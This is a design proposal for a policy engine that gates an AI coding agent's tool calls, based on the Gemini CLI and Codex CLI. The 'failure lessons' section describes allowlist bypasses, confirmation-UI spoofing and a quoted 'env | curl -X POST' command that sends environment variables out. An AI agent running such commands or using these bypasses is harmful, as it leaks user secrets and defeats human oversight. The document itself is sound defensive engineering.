# Unified policy engine — reference notes, then Ronin's design

**Status: DESIGN FOR REVIEW. Not implemented.** Phase 7 item #2. Per the work
order, the Gemini CLI and Codex reference notes come **first**; Ronin's design is
proposed only after them.

---

# Part 1 — Reference design: Gemini CLI

Sources: `docs/reference/policy-engine.md`, `docs/cli/enterprise.md`,
`docs/cli/trusted-folders.md`, `docs/tools/shell.md`, plus GHSA-wpqr-6v78-jr5g
(CVE-2026-12537, CVSS 10.0) and Tracebit's July 2025 disclosure. Note there are
*two* overlapping layers: legacy `settings.json` keys
(`tools.core`/`tools.exclude`/`tools.allowed`) and a newer first-class TOML
**Policy Engine**. The Policy Engine is the design worth studying.

**Mechanisms worth copying:**

1. **Tiered priority as arithmetic.** Each rule's final priority is
   `tier_base + (toml_priority / 1000)`, `toml_priority` ∈ 0–999, with tier bases
   Default=1, Extension=2, Workspace=3, User=4, **Admin=5**. Because the tiers
   occupy disjoint numeric bands, **admin supremacy is structural, not
   procedural** — no in-tier priority can climb into the tier above.
2. **Three decisions, with capability *hiding* for deny.** `allow`, `deny`,
   `ask_user`. For global rules, deny means the tool is "completely excluded from
   the model's memory" — the model never sees it. Denial isn't just refusing a
   call; it's removing the affordance.
3. **Non-interactive downgrade.** `ask_user` with no human present becomes deny.
   Fail-closed by construction rather than by remembering to check.
4. **Matching primitives.** `toolName` (exact or wildcard: `*`,
   `mcp_server_*`, `mcp_*_toolName`) plus `argsPattern`, a regex tested against a
   **stable JSON serialization** of the arguments — the serialization's stability
   is what makes the regex meaningful.
5. **Shell: prefix matching + chain splitting.** `run_shell_command(<prefix>)`
   matches by prefix; the tool **splits on `&&`, `||`, `;` and validates each
   part**. Command substitution `$()`, `<()`, `>()` is **hard-blocked
   unconditionally** — enforced even under YOLO, and Google has held that line
   against user requests to relax it. Redirection (`>`, `>>`, …) is a
   *separately gated capability* (`allowRedirection`), per command within a chain.
6. **Modes as a permissiveness lattice with a config-can't-escalate rule.**
   `plan < default < autoEdit < yolo`, and `general.defaultApprovalMode` accepts
   only the first three — **YOLO can only be set on the command line**, so a
   config file can never silently enable it.
7. **`disableYoloMode` as an admin kill switch**, effective because system
   settings sit above user and workspace in the precedence ladder. Admin
   authority is validated against **filesystem ownership** (root/UID 0,
   non-group-writable; ProgramData ACLs), and admin policy files are ignored if
   those checks fail.
8. **Folder Trust as a gate on config loading itself.** An untrusted folder runs
   in safe mode where `.gemini/settings.json` is *not loaded at all* and `.env`
   is ignored — orthogonal to, and prior to, tool permissions.
9. **MCP trust at two granularities:** per-server `trust: true` (blunt — bypasses
   all confirmations for that server) and per-tool `includeTools`/`excludeTools`.

**Failure lessons — these are the most valuable part:**

- **CVE-2026-12537 (CVSS 10.0):** `--yolo` **ignored the fine-grained allowlist
  entirely**. Lesson: a permissive mode must route *through* the enforcement
  path, never around it.
- **Same CVE, second leg:** headless/CI mode **auto-trusted any workspace
  folder**, so attacker-supplied `.gemini/` config and `.env` from a PR branch
  were loaded. Lesson: never make trust implicit in CI.
- **Tracebit:** the shell allowlist extracted a "root" command by cursory
  parsing, so `grep Install README.md | head -n 3 ; env | curl -X POST …`
  bypassed it. Lesson: parse properly, or split and validate every segment.
- **UI spoofing:** padding a command with long whitespace runs pushed the
  malicious tail out of the visible confirmation. Lesson: what the human approves
  must be what executes, rendered without truncation tricks.
- **Default-open merge semantics:** arrays/objects merge across precedence
  layers, and an omitted `mcp.allowed` means "allow any server the user defines".
  Lesson: absence must mean deny, not allow.

# Part 2 — Reference design: OpenAI Codex CLI

Sources: `learn.chatgpt.com/docs/sandboxing`, `/agent-approvals-security`,
`/permissions`, `/config-file/config-reference`, and
`codex-rs/linux-sandbox/README.md`.

**Correction to the brief:** the work order describes Codex's Linux sandbox as
"Landlock+seccomp". Current docs state **bubblewrap (`bwrap`) + seccomp is the
default**; Landlock is now an explicit *legacy fallback*
(`features.use_legacy_landlock = true`). Recorded so the design isn't reasoning
from a stale mechanism.

**Mechanisms worth copying:**

1. **Two orthogonal axes, not one mode enum.** `sandbox_mode` = *what is
   technically possible* (`read-only` | `workspace-write` |
   `danger-full-access`); `approval_policy` = *when a human is asked*
   (`untrusted` | `on-request` | `never` | `granular{...}`). Their cross-product
   expresses things one enum cannot — e.g. read-only + never = safe autonomous
   CI. **This is the single best idea in either reference.**
2. **The sandbox is the enforcement boundary, and they say why.** "The sandbox is
   the boundary that lets the agent act autonomously without giving it
   unrestricted access to your machine." Approval prompts are consent layered on
   top of a capability limit — not a substitute for one.
3. **Documented defaults derived from context:** version-controlled folder →
   workspace-write + on-request; non-version-controlled → read-only.
4. **Fail closed at every layer, explicitly.** On macOS, if a policy cannot be
   enforced Codex "refuses to run the command instead of silently running it
   unsandboxed."
5. **Escalation as a typed tool parameter, never prose.** The shell tool
   advertises `sandbox_permissions` ∈ `use_default` |
   `with_additional_permissions` | `require_escalated`, with a **required
   justification**. A least-privilege middle tier
   (`additional_permissions{network.enabled, file_system.read, file_system.write}`)
   sits between sandboxed and unsandboxed.
6. **The unit of policy is the command *segment*.** The string is split at shell
   control operators — `|`, `&&`, `||`, `;`, subshells `(...)`, substitutions
   `$(...)` — and each segment is evaluated independently; strings containing
   substitution are refused rule credit.
7. **`execve` interception** (`codex-execve-wrapper`) delegating Run / Escalate /
   Deny over a shared fd, so escalation happens *mid-shell*, not only at
   tool-call boundaries.
8. **Network: separate switches for *whether* and *where*.** Default **off**;
   `sandbox_workspace_write.network_access` decides whether;
   `features.network_proxy` decides where, with unusually precise domain
   semantics — exact hosts match only themselves, `*.example.com` matches
   subdomains but **excludes the apex**, `**.example.com` includes it, **deny
   always beats allow** — plus local-destination blocking and DNS-rebinding
   checks. The section carries an explicit prompt-injection/exfiltration warning.
9. **Protect agent-config paths from the agent inside its own writable root:**
   `<writable_root>/.git` (including a resolved `gitdir:` pointer target),
   `.agents`, and `.codex` are recursively denied.
10. **Documented non-coverage** — containerized hosts that block namespaces or
    seccomp, native Windows being weaker than WSL2, etc. The scoping is the
    honest part of the model.

# Part 3 — Ronin today: 22 checks, one funnel

The authorization-surface audit found **no single evaluation point**. Highlights:

- **Four tool-gate compositions** re-implement the same ordering by hand, each
  with its own denial strings and headless behavior: the console gate
  (`code_mode.py:500-644`), the front-end wrapper (`code_mode.py:915-942`),
  investigate mode (`investigate_mode.py:83-108`, which consults **no**
  permission rules and has its own sensitive set), and the web API gate.
- **Two incompatible policy subjects:** `is_floored_tool_call(name, args)` vs
  `gate_level(action_dict)` (`approvals.py:534-568`, `:576-616`) — two languages
  over two input shapes, in the same file.
- **Path containment re-implemented four times** (`code_tools.py:152`, `:200`,
  `lsp.py:331`, `vision_tools.py:70`) with divergent rules, and only under
  `if sandbox`.
- **No egress authorization at all:** `fetch_url` accepts any host, prepends
  `https://` to a bare string, follows redirects, with no scheme or private-IP
  policy (`web_tools.py:87-95`). Offline mode rests on subtracting a hardcoded
  tool-name set.
- **Provider and deployment rules don't exist** as policy dimensions.
- **Cost:** hard enforcement only in the API-key store; the interactive loop
  merely prints a warning.
- **Decision audit absent.** `AutonomyLedger` is a real tamper-evident chain that
  refuses to append to an invalid ledger — and no gate writes to it. MCP tool
  calls are never logged at all.
- **RBAC is dead code** (`rbac.py:71-75` is complete and fail-closed; nothing
  outside `packages/identity` imports it). **Feature flags aren't
  backend-enforced.** **"Dangerous command" has four separate spellings.**
- **Trust decisions happen before any gate exists**, at three independent sites
  (plugins, `mcp.json`, hooks) — so an engine at the tool-call seam structurally
  cannot cover them.

**What's genuinely good and must survive:** the destructive floor's nested-payload
inspection, not waivable by `--yolo` (`approvals.py:534-568`); the fail-closed
drift guard that refuses to run when a mutating tool reached the toolbelt but not
the gate (`code_mode.py:898-905`); deny-rules that win over allow and apply under
`--yolo` (`permissions.py:94-113`); default-deny on empty/EOF/error in `approve()`;
MCP `readOnlyHint` distrusted by design.

**And the key asset: there is exactly one funnel.** `before_tool(name, args)`
inside `ReActAgent._resolve_and_gate` (`react.py:493-524`) is the single point
every tool call passes through, with a documented verdict contract. That is where
the engine goes.

# Part 4 — Proposed design

**D1. Two orthogonal axes** (from Codex). `capability` — what is technically
possible for this run (`read_only` | `workspace_write` | `full_access`) — and
`consent` — when a human is asked (`untrusted` | `on_request` | `never`). Today's
`--yolo`/sandbox flags collapse into this cross-product. `read_only + never` is
the safe headless CI cell that currently has no clean expression.

**D2. One normalized subject.** A single `Action` record — `{tool, args,
segments[], paths[], hosts[], provider, estimated_cost, pack, actor}` — computed
once and fed to every rule. This replaces the two incompatible subjects and is
the prerequisite for everything else.

**D3. Tiered precedence as arithmetic** (from Gemini): `tier_base +
priority/1000`, tiers `default=1 < pack=2 < workspace=3 < user=4 < admin=5`, so
an org rule cannot be out-prioritized from a repo. **Absence means deny, never
allow** — the merge-semantics lesson. **Deny always beats allow** within a tier.

**D4. Three decisions + downgrade.** `allow` | `deny` | `ask`. `ask` with no
human ⇒ `deny`. Where feasible, `deny` also **hides** the tool from the model
rather than only refusing the call.

**D5. Segment-level command evaluation** (both references): split on `|`, `&&`,
`||`, `;`, subshells and substitutions; evaluate **every** segment; refuse rule
credit to any string containing substitution. This closes the Tracebit-class
bypass directly, and Ronin's four spellings of "dangerous command" collapse into
one predicate over segments.

**D6. Egress becomes a real dimension:** default-deny host policy with Codex's
domain semantics copied wholesale (exact-host, `*` excludes apex, `**` includes
it, deny beats allow), private-address and scheme checks, redirect
re-evaluation. Separate switches for *whether* network is on and *where* it may
go.

**D7. Provider, cost, reviewer, deployment as first-class dimensions**, so
"this pack may not use a cloud provider", "this run may not exceed $X", "this
promotion needs a named human", and "no force-push" are rules rather than
scattered special cases. `max_cost_usd` becomes enforceable once cost is a
dimension (today no provider emits `cost_usd`, so it is dead).

**D8. Packs declare rules.** A pack's `policies/*.yaml` — currently parsed by
nothing — become tier-2 inputs. This is simultaneously the fix for the domain
contract's biggest gap and what makes the two-pack demonstration meaningful.

**D9. Every decision is audited into *one* hash chain** (`AutonomyLedger`, not a
fifth implementation): action, matched rule, tier, verdict, approver. Without
this, nothing above is provable after the fact.

**D10. Non-negotiables, taken from the CVEs.** The permissive mode routes
**through** the engine, never around it (CVE-2026-12537). Trust is never implicit
in CI (its second leg). The destructive floor stays non-waivable. What the human
sees is what executes, un-truncated (the UI-spoofing leg). Agent-config paths
(`.git`, `.ronin`, plugin dirs) are denied inside the writable root.

**D11. Sequencing.** The engine lands at `before_tool` first, with the four
existing gate compositions becoming thin callers — not deleted, so their
regression tests keep passing. Trust decisions (plugins/`mcp.json`/hooks) happen
*before* any tool call and are explicitly **out of scope for v1**; they need a
separate pre-session evaluation point, which this design should not pretend to
cover.

## Honest limit: Ronin has no OS-level sandbox on the main path

Codex's framing works because the sandbox enforces and policy advises. Ronin has
Docker isolation for *mission candidates* only; the ordinary CLI path has **no
OS-level boundary**. So a unified policy engine here is **in-process** and is
bypassed by any code that doesn't route through `before_tool` — a plugin calling
`subprocess` directly, for instance. That is a real gap, not a detail:

- v1 should say so plainly rather than implying sandbox-grade guarantees;
- the engine should be designed so an OS sandbox can be slotted underneath later
  (which is why capability is a separate axis from consent);
- until then, the in-process funnel plus the non-waivable floor is the honest
  claim, and "policy engine" should not be marketed as containment.

## Test plan (the definition of done)

Not unit tests of rule matching. The required demonstration: **a real destructive
action denied end-to-end, in two different domain packs** — e.g. `rm -rf` reaching
the runtime under `--yolo` in the coding pack, and a network-egress attempt in the
second pack — asserting the action did **not** execute (filesystem/host state
unchanged), the verdict was `deny`, and the decision landed in the hash chain.
Plus: a segment-bypass regression (`safe_cmd ; dangerous_cmd`), an `ask`-with-no-human
⇒ `deny` test, and a test that the permissive mode does not bypass the engine.
Exact pass/fail counts reported.

---

**Review asks.** (1) Approve the two-axis model (D1) as the replacement for
today's mode flags? (2) Approve `Action` normalization (D2) as the first commit,
since everything else depends on it? (3) Accept that trust decisions
(plugins/MCP/hooks) are explicitly out of v1 scope? (4) Accept the "no OS sandbox
on the main path" limitation being stated in the docs, rather than implying
containment?
